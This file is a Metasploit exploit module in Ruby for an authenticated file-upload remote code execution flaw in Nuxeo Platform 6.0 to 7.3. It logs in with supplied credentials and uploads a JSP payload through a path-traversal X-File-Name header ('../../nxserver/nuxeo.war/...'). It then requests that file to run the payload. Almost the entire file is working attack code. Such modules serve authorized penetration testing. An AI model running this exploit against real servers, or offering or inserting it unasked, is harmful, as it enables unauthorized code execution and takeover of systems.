##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient

    def initialize(info={})
        super(update_info(info,
            'Name'              => "Nuxeo Platform File Upload RCE",
            'Description'       => %q{
                The Nuxeo Platform tool is vulnerable to an
authenticated remote code execution,
                thanks to an upload module.
            },
            'License'           => MSF_LICENSE,
            'Author'            => ['Ronan Kervella
<r.kervella@sysdream.com>'],
            'References'        =>
                [
                    ['https://nuxeo.com/', '']
                ],
            'Platform'          => %w{linux},
            'Targets'           => [ ['Nuxeo Platform 6.0 to 7.3',
'Platform' => 'linux'] ],
            'Arch'              => ARCH_JAVA,
            'Privileged'        => true,
            'Payload'           => {},
            'DisclosureDate'    => "",
            'DefaultTarget'     => 0))
        register_options(
            [
                OptString.new('TARGETURI', [true, 'The path to the nuxeo
application', '/nuxeo']),
                OptString.new('USERNAME', [true, 'A valid username', '']),
                OptString.new('PASSWORD', [true, 'Password linked to the
username', ''])
            ], self.class)
    end

    def jsp_filename
        @jsp_filename ||= Rex::Text::rand_text_alpha(8) + '.jsp'
    end

    def jsp_path
        'nxserver/nuxeo.war/' + jsp_filename
    end

    def nuxeo_login
        res = send_request_cgi(
            'method' => 'GET',
            'uri'    => normalize_uri(target_uri.path, '/login.jsp')
        )

        fail_with(Failure::Unreachable, 'No response received from the
target.') unless res
        session_cookie = res.get_cookies

        res = send_request_cgi(
            'method'    => 'POST',
            'uri'       => normalize_uri(target_uri.path,
'/nxstartup.faces'),
            'cookie'    => session_cookie,
            'vars_post' => {
                'user_name'     => datastore['USERNAME'],
                'user_password' => datastore['PASSWORD'],
                'submit'        => 'Connexion'
            }
        )
        return session_cookie if res && res.code == 302 &&
res.redirection.to_s.include?('view_home.faces')
        nil
    end

    def trigger_shell
        res = send_request_cgi(
            'method'    => 'GET',
            'uri'       => normalize_uri(target_uri.path, jsp_filename)
        )
        fail_with(Failure::Unknown, 'Unable to get
#{full_uri}/#{jsp_filename}') unless res && res.code == 200
    end

    def exploit
        print_status("Authenticating using
#{datastore['USERNAME']}:#{datastore['PASSWORD']}")
        session_cookie = nuxeo_login
        if session_cookie
            payload_url = normalize_uri(target_uri.path, jsp_filename)
            res = send_request_cgi(
                'method'    => 'POST',
                'uri'       => normalize_uri(target_uri.path,
'/site/automation/batch/upload'),
                'cookie'    => session_cookie,
                'headers'    => {
                    'X-File-Name'   => '../../' + jsp_path,
                    'X-Batch-Id'    => '00',
                    'X-File-Size'   => '1024',
                    'X-File-Type'   => '',
                    'X-File-Idx'    => '0',
                    'X-Requested-With'  => 'XMLHttpRequest'
                },
                'ctype'             => '',
                'data' => payload.encoded
            )
            fail_with(Failure::Unknown, 'Unable to upload the payload')
unless res && res.code == 200
            print_status("Executing the payload at
#{normalize_uri(target_uri.path, payload_url)}.")
            trigger_shell
        else
            fail_with(Failure::Unknown, 'Unable to login')
        end
    end

end
